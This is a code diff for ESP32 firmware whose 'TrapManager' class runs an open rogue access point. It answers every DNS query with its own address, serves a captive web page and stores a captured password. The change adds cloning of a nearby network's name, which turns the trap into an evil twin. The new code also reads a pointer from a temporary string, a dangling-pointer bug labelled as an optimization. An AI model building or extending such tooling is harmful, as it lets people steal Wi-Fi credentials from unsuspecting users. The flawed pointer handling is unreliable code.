@@ -6,7 +6,7 @@
 #include <WebServer.h>
 #include <WiFi.h>
 
-static const char *TRAP_SSID = "FREE_WIFI_CONNECT";
+static const char *TRAP_SSID_DEFAULT = "FREE_WIFI_CONNECT";
 static const byte DNS_PORT = 53;
 static const IPAddress AP_IP(192, 168, 4, 1);
 static const IPAddress AP_NETMASK(255, 255, 255, 0);
@@ -14,19 +14,26 @@ static const IPAddress AP_NETMASK(255, 255, 255, 0);
 DNSServer dnsServer;
 WebServer server(80);
 
-TrapManager::TrapManager() { lastPassword_[0] = '\0'; }
+TrapManager::TrapManager() {
+  lastPassword_[0] = '\0';
+  clonedSSID_[0] = '\0';
+  useClonedSSID_ = false;
+}
 
 void TrapManager::start() {
   if (active_)
     return;
   WiFi.mode(WIFI_AP);
   WiFi.softAPConfig(AP_IP, AP_IP, AP_NETMASK);
-  WiFi.softAP(TRAP_SSID, nullptr, 1, 0, 4);
+  const char *ssidToUse = useClonedSSID_ && clonedSSID_[0] != '\0'
+                              ? clonedSSID_
+                              : TRAP_SSID_DEFAULT;
+  WiFi.softAP(ssidToUse, nullptr, 1, 0, 4);
   dnsServer.start(DNS_PORT, "*", AP_IP);
   setupHandlers();
   server.begin();
   active_ = true;
-  Serial.println("[TRAP] AP up: " + String(TRAP_SSID));
+  Serial.println("[TRAP] AP up: " + String(ssidToUse));
 }
 
 void TrapManager::stop() {
@@ -98,6 +105,29 @@ void TrapManager::tick() {
     return;
   dnsServer.processNextRequest();
   server.handleClient();
+}
+
+void TrapManager::setClonedSSID(int scanIndex) {
+  int n = WiFi.scanComplete();
+  if (n <= 0 || scanIndex < 0 || scanIndex >= n) {
+    useClonedSSID_ = false;
+    clonedSSID_[0] = '\0';
+    return;
+  }
+  // Optimized: use c_str() instead of String
+  const char *ssid = WiFi.SSID(scanIndex).c_str();
+  if (!ssid || strlen(ssid) == 0) {
+    useClonedSSID_ = false;
+    clonedSSID_[0] = '\0';
+    return;
+  }
+  size_t len = strlen(ssid);
+  if (len >= 33)
+    len = 32;
+  strncpy(clonedSSID_, ssid, len);
+  clonedSSID_[len] = '\0';
+  useClonedSSID_ = true;
+  Serial.println("[TRAP] Cloned SSID: " + String(clonedSSID_));
 }
 
 int TrapManager::getClientCount() const {
